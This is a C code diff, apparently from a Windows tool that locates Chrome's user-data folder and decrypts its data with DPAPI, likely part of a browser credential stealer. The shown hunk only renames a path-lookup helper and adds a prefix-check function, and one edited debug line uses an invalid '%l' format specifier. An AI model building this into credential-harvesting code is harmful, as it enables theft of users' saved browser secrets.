@@ -31,37 +31,47 @@ BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* d
 }
 
 // Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
-BOOL get_browser_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
+BOOL get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
 	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
 	HRESULT hr;																						// Error handling 
 	errno_t err;																					// Error handling 
 
 	/* Get Local Appdata Directory of the user */
 	if (FAILED(hr = SHGetKnownFolderPath(folder_id, 0, NULL, &p_temp_userdata_location))) {
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: SHGetKnownFolderPath: Getting Local Appdata Directory error code: %d\n", hr);)
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: SHGetKnownFolderPath: Getting Local Appdata Directory error code: %l\n", hr);)
 		CoTaskMemFree(p_temp_userdata_location);
 		return FALSE;
 	}
 
 	/* Copy %LOCALAPPDATA% location to permenant buffer */
 	if ((err = wmemcpy_s(buf_path, MAX_PATH, p_temp_userdata_location, lstrlenW(p_temp_userdata_location))) != 0) {
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);)
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);)
 		return FALSE;
 	}
 
 	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
 	if ((err = wmemcpy_s(buf_path + lstrlenW(p_temp_userdata_location), MAX_PATH, browser_location, lstrlenW(browser_location)+1)) != 0) {
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);)
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);)
 		return FALSE;
 	}
 
 	/* Check if that Chrome path exitsts */
 	if (!PathFileExistsW(buf_path)) {
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: PathFileExistsW: No folder found.\n");)
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: PathFileExistsW: No folder found.\n");)
 		return FALSE;
 	}
 
 	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
 	CoTaskMemFree(p_temp_userdata_location);
 	return TRUE;
+}
+
+BOOL checkSubtring(const CHAR* substring, PCHAR test_string) {
+	if (lstrlenA(substring) <= lstrlenA(test_string)) {
+		for (int i = 0; i < lstrlenA(substring); i++) {
+			if (substring[i] != test_string[i]) return FALSE;
+		}
+		return TRUE;
+	}
+	return FALSE;
 }
